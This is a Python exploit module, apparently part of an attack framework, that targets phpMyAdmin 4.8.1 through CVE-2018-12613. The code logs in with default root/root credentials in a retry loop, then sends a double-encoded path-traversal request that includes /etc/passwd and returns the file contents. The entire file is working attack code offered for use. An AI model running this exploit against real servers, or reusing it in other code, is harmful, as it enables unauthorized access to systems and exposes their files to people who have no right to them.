import os
import sys
import requests
import re
import urllib
import logging
sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from basic import Basic


class Phpmyadmin(Basic):

    name = "phpmyadmin"

    def __init__(self, dest_ip, dest_port, args):
        super(Phpmyadmin, self).__init__(dest_ip, dest_port, args)
        self.cve = "CVE-2018-12613 远程文件包含漏洞"
        self.service = "phpmyadmin 4.8.1"

    def exploit(self):
        uri = '/index.php'
        try:
            while True:
                res = requests.get(url="http://" + self.dest_ip + ":" + self.dest_port + uri)
                set_session = re.findall(r"name=\"set_session\" value=\"(.*?)\" \/", res.text)[0]
                token = re.findall(r"name=\"token\" value=\"(.*?)\" \/", res.text)[0]
                cookie = "".join([f"{x}={y}; " for x, y in res.cookies.get_dict().items()])[:-2]
                # 登录
                header = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": cookie
                }
                payload = {
                    "set_session": set_session,
                    "pma_username": "root",
                    "pma_password": "root",
                    "server": "1",
                    "target": "index.php",
                    "token": token
                }
                payload = urllib.parse.urlencode(payload)
                res = requests.post(url="http://" + self.dest_ip + ":" + self.dest_port + uri, data=payload, headers=header)
                # 获取登录后的set cookies 使用poc的url进行漏洞验证
                if "The secret passphrase in configuration (blowfish_secret) is too short." in res.text:
                    logging.info("login success..")
                    break
            login_cookie = "".join([f"{x}={y}; " for x, y in res.cookies.get_dict().items()])[:-2]
            poc_uri = '/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd'
            header.update({"Cookie": login_cookie})
            res = requests.get(url="http://" + self.dest_ip + ":" + self.dest_port + poc_uri, headers=header)
            return res.text[46100:]
        except Exception as e:
            return e
